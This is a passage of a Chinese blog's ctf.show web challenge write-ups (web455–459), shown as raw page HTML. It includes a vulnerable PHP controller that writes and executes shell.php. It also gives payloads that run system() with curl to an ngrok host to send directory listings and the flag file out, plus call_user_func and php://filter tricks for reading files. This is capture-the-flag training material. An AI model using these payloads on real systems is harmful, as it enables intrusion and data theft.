class="function"><span class="keyword">function</span> <span class="title">show</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$s</span>));</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">file</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line"> 		 <span class="variable">$response</span>-&gt;<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type&#x27;</span>, <span class="string">&#x27;text/html; charset=utf-8&#x27;</span>);</span><br><span class="line">		 <span class="variable">$s</span>=<span class="variable">$request</span>-&gt;post[<span class="string">&#x27;s&#x27;</span>];</span><br><span class="line">		 <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$s</span>))&#123;</span><br><span class="line">		 	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;shell.php&#x27;</span>, <span class="variable">$s</span>);</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;file write done in /var/www/shell.php&#x27;</span>);</span><br><span class="line">		 &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		 	<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;s not found&#x27;</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">exec</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		<span class="title function_ invoke__">system</span>(<span class="string">&#x27;php shell.php&#x27;</span>);</span><br><span class="line">		<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;include done&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">reload</span>(<span class="params"><span class="variable">$request</span>,<span class="variable">$response</span></span>)</span>&#123;</span><br><span class="line">		<span class="keyword">global</span> <span class="variable">$http</span>;</span><br><span class="line">		<span class="variable">$http</span>-&gt;<span class="title function_ invoke__">reload</span>();</span><br><span class="line">		<span class="variable">$response</span>-&gt;<span class="title function_ invoke__">end</span>(<span class="string">&#x27;reload done&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`ls`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show//ctf/exec</span></span><br><span class="line">http:<span class="comment">//95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show/ctf/file</span></span><br><span class="line">POST</span><br><span class="line">s=<span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;curl http://b423-111-17-194-91.ngrok.io?1=`cat flsaaag`&#x27;</span>); <span class="meta">?&gt;</span></span><br><span class="line">http:<span class="comment">//95378ee8-e4ba-4b44-8668-06cc49739290.challenge.ctf.show//ctf/exec</span></span><br></pre></td></tr></table></figure>

<h1 id="web457"><a href="#web457" class="headerlink" title="web457"></a>web457</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-06 12:19:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span>  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">visitor</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;username!==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password!==<span class="string">&#x27;admin888&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable language_">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>==<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title class_">visitor</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome visitor :&#x27;</span>.<span class="variable">$u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title class_">admin</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome admin :&#x27;</span>.<span class="variable">$u</span>.<span class="string">&#x27; flag is :&#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?u=admin&amp;p=phpinfo</span><br></pre></td></tr></table></figure>

<p>先进入第二个语句,phpinfo执行结果为true</p>
<h1 id="web458"><a href="#web458" class="headerlink" title="web458"></a>web458</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-06 12:19:36</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"><span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span>  <span class="variable">$password</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$u</span>,<span class="variable">$p</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="variable">$u</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password=<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span>  <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">visitor</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> (<span class="variable language_">$this</span>-&gt;username!==<span class="string">&#x27;admin&#x27;</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;password!==<span class="string">&#x27;admin888&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">admin</span> <span class="keyword">extends</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span>  <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$u</span>= <span class="title function_ invoke__">call_user_func</span>(<span class="variable language_">$this</span>-&gt;password);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$u</span>===<span class="string">&#x27;admin&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title class_">visitor</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome visitor :&#x27;</span>.<span class="variable">$u</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span>((<span class="keyword">new</span> <span class="title class_">admin</span>(<span class="variable">$u</span>,<span class="variable">$p</span>))-&gt;<span class="title function_ invoke__">check</span>())&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;welcome admin :&#x27;</span>.<span class="variable">$u</span>.<span class="string">&#x27; flag is :&#x27;</span>.<span class="variable">$flag</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?u=admin&amp;p=get_class</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get_class (): 获取当前调用方法的类名； </span><br><span class="line">get_called_class():获取静态绑定后的类名；</span><br></pre></td></tr></table></figure>

<h1 id="web459"><a href="#web459" class="headerlink" title="web459"></a>web459</h1><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"> Author: h1xa</span></span><br><span class="line"><span class="comment"> Date:   2021-02-06 01:58:32</span></span><br><span class="line"><span class="comment"> Last Modified by:   h1xa</span></span><br><span class="line"><span class="comment"> Last Modified time: 2021-02-06 13:25:16</span></span><br><span class="line"><span class="comment"> email: h1xa<span class="doctag">@ctfer</span>.com</span></span><br><span class="line"><span class="comment"> link: https://ctfer.com</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&#x27;flag.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$u</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>];</span><br><span class="line"><span class="variable">$p</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;p&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$u</span>)&amp;&amp;<span class="keyword">isset</span>(<span class="variable">$p</span>))&#123;</span><br><span class="line">    <span class="title function_ invoke__">copy</span>(<span class="variable">$u</span>, <span class="variable">$p</span>.<span class="string">&#x27;.php&#x27;</span>);</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure>

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?u=php:<span class="comment">//filter/convert.base64-encode/resource=flag.php&amp;p=1</span></span><br></pre></td></tr></table></figure>

<p>直接读取读不到php文件,所以进行一下base64编码</p>
</article><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf-show/">ctf.show</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.pixabay.com/photo/2014/11/15/23/31/alpsee-532864_1280.jpg" data-sites="qq,wechat,weibo,facebook,twitter"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/ctfshow/ctf.show/%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86/"><img class="prev-cover" src="https://cdn.pixabay.com/photo/2016/10/22/17/46/mountains-1761292_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">信息收集</div></div></a></div><div class="next-post pull-right"><a href="/ctfshow/ctf.show/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"><img class="next-cover" src="https://cdn.pixabay.com/photo/2018/01/12/14/24/night-3078326_1280.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">反序列化</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/ctfshow/ctf.show/CMS/" title="CMS"><img class="cover" src="https://cdn.pixabay.com/photo/2017/07/19/01/41/clouds-2517653_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-17</div><div class="title">CMS</div></div></a></div><div><a href="/ctfshow/ctf.show/JWT/" title="JWT"><img class="cover" src="https://cdn.pixabay.com/photo/2017/02/22/17/02/beach-2089936_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-17</div><div class="title">JWT</div></div></a></div><div><a href="/ctfshow/ctf.show/SSTI/" title="SSTI"><img class="cover" src="https://cdn.pixabay.com/photo/2015/10/30/20/13/sea-1014710_1280.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2022-04-17</div><div class="title">SSTI</div></div></a></div></div></div><hr/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> 评论</span></div><div id="comment-switch"><span class="first-comment">Valine</span><span class="switch-btn"></span><span class="second-comment">Disqus</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div><div><div id="disqus_thread"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content is-expand"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#web396"><span class="toc-number">1.</span> <span class="toc-text">web396</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web397"><span class="toc-number">2.</span> <span class="toc-text">web397</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web398"><span class="toc-number">3.</span> <span class="toc-text">web398</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web399"><span class="toc-number">4.</span> <span class="toc-text">web399</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web400"><span class="toc-number">5.</span> <span class="toc-text">web400</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web401"><span class="toc-number">6.</span> <span class="toc-text">web401</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web402"><span class="toc-number">7.</span> <span class="toc-text">web402</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web403"><span class="toc-number">8.</span> <span class="toc-text">web403</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#405"><span class="toc-number">9.</span> <span class="toc-text">405</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web405"><span class="toc-number">10.</span> <span class="toc-text">web405</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web406"><span class="toc-number">11.</span> <span class="toc-text">web406</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web407"><span class="toc-number">12.</span> <span class="toc-text">web407</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web408"><span class="toc-number">13.</span> <span class="toc-text">web408</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web409"><span class="toc-number">14.</span> <span class="toc-text">web409</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web410"><span class="toc-number">15.</span> <span class="toc-text">web410</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web411"><span class="toc-number">16.</span> <span class="toc-text">web411</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web412"><span class="toc-number">17.</span> <span class="toc-text">web412</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web413"><span class="toc-number">18.</span> <span class="toc-text">web413</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web414"><span class="toc-number">19.</span> <span class="toc-text">web414</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web415"><span class="toc-number">20.</span> <span class="toc-text">web415</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web416"><span class="toc-number">21.</span> <span class="toc-text">web416</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web417"><span class="toc-number">22.</span> <span class="toc-text">web417</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web418"><span class="toc-number">23.</span> <span class="toc-text">web418</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web419"><span class="toc-number">24.</span> <span class="toc-text">web419</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web420"><span class="toc-number">25.</span> <span class="toc-text">web420</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web421"><span class="toc-number">26.</span> <span class="toc-text">web421</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web422"><span class="toc-number">27.</span> <span class="toc-text">web422</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#we4b23"><span class="toc-number">28.</span> <span class="toc-text">we4b23</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web424"><span class="toc-number">29.</span> <span class="toc-text">web424</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web425"><span class="toc-number">30.</span> <span class="toc-text">web425</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web426"><span class="toc-number">31.</span> <span class="toc-text">web426</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web427"><span class="toc-number">32.</span> <span class="toc-text">web427</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web428"><span class="toc-number">33.</span> <span class="toc-text">web428</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web429"><span class="toc-number">34.</span> <span class="toc-text">web429</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web430"><span class="toc-number">35.</span> <span class="toc-text">web430</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web431"><span class="toc-number">36.</span> <span class="toc-text">web431</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web432"><span class="toc-number">37.</span> <span class="toc-text">web432</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web433"><span class="toc-number">38.</span> <span class="toc-text">web433</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web434"><span class="toc-number">39.</span> <span class="toc-text">web434</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web435"><span class="toc-number">40.</span> <span class="toc-text">web435</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web436-439"><span class="toc-number">41.</span> <span class="toc-text">web436-439</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web440"><span class="toc-number">42.</span> <span class="toc-text">web440</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web441"><span class="toc-number">43.</span> <span class="toc-text">web441</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web442"><span class="toc-number">44.</span> <span class="toc-text">web442</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web443"><span class="toc-number">45.</span> <span class="toc-text">web443</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web450"><span class="toc-number">46.</span> <span class="toc-text">web450</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web451"><span class="toc-number">47.</span> <span class="toc-text">web451</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web452"><span class="toc-number">48.</span> <span class="toc-text">web452</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web453"><span class="toc-number">49.</span> <span class="toc-text">web453</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web454"><span class="toc-number">50.</span> <span class="toc-text">web454</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web455-456"><span class="toc-number">51.</span> <span class="toc-text">web455-456</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web457"><span class="toc-number">52.</span> <span class="toc-text">web457</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web458"><span class="toc-number">53.</span> <span class="toc-text">web458</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#web459"><span class="toc-number">54.</span> <span class="toc-text">web459</span></a></li></ol></div></div></div></div></main><footer id="footer" style="background: linear-gradient(20deg, #0062be, #925696, #cc426e, #fb0347)"><div id="footer-wrap"><div class="copyright">&copy;2021 - 2022 By wanan</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"></div><div id="rightside-config-show"><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="chat_btn" type="button" title="聊天"><i class="fas fa-sms"></i></button><a id="to_comment" href="#post-comment" title="直达评论"><i class="fas fa-comments"></i></a><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/instant.page/instantpage.min.js" type="module"></script><script>function panguFn () {
  if (typeof pangu === 'object') pangu.autoSpacingPage()
  else {
    getScript('https://cdn.jsdelivr.net/npm/pangu/dist/browser/pangu.min.js')
      .then(() => {
        pangu.autoSpacingPage()
      })
  }
}

function panguInit () {
  if (false){
    GLOBAL_CONFIG_SITE.isPost && panguFn()
  } else {
    panguFn()
  }
}

document.addEventListener('DOMContentLoaded', panguInit)</script><script src="/js/search/local-search.js"></script><div class="js-pjax"><script>function loadValine () {
  function initValine () {
    const valine = new Valine(Object.assign({
      el: '#vcomment',
      appId: 'RjFSSKpeg1lxuvDjmLndzaLO-MdYXbMMI',
      appKey: '8qrAyIwMaJTebKjjzPnV0SFT',
      avatar: 'monsterid',
      serverURLs: '',
      emojiMaps: "",
      path: window.location.pathname,
      visitor: false
    }, null))
  }

  if (typeof Valine === 'function') initValine() 
  else getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js').then(initValine)
}

if ('Valine' === 'Valine' || !false) {
  if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
  else setTimeout(loadValine, 0)
} else {
  function loadOtherComment () {
    loadValine()
  }
}</script><script>function loadDisqus () {
  var disqus_config = function () {
    this.page.url = 'https://lovewanan.github.io/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/'
    this.page.identifier = '/ctfshow/ctf.show/%E5%85%B6%E4%BB%96/'
    this.page.title = '其他'
  };

  window.disqusReset = () => {
    DISQUS.reset({
      reload: true,
      config: disqus_config
    })
  }

  if (window.DISQUS) disqusReset()
  else {
    (function() { 
      var d = document, s = d.createElement('script');
      s.src = 'https://www-wanan-red.disqus.com/embed.js';
      s.setAttribute('data-timestamp', +new Date());
      (d.head || d.body).appendChild(s);
    })();
  }

  document.getElementById('darkmode').addEventListener('click', () => {
    setTimeout(() => window.disqusReset(), 200)
  })
}

if ('Valine' === 'Disqus' || !false) {
  if (false) btf.loadComment(document.getElementById('disqus_thread'), loadDisqus)
  else loadDisqus()
} else {
  function loadOtherComment () {
    loadDisqus()
  }
}
</script></div><script>(function(d, w, c) {
    w.ChatraID = 'LAbfxFAsFCbvYgjHY';
    var s = d.createElement('script');
    w[c] = w[c] || function() {
        (w[c].q = w[c].q || []).push(arguments);
    };
    s.async = true;
    s.src = 'https://call.chatra.io/chatra.js';
    if (d.head) d.head.appendChild(s);
})(document, window, 'Chatra');

if (true) {
  var chatBtnFn = () => {
    var chatBtn = document.getElementById("chat_btn")
    chatBtn.addEventListener("click", function(){
      Chatra('openChat')
    });
  }
  chatBtnFn()
} else {
  if (false) {
    function chatBtnHide () {
      Chatra('hide')
    }
    function chatBtnShow () {
      Chatra('show')
    }
  }
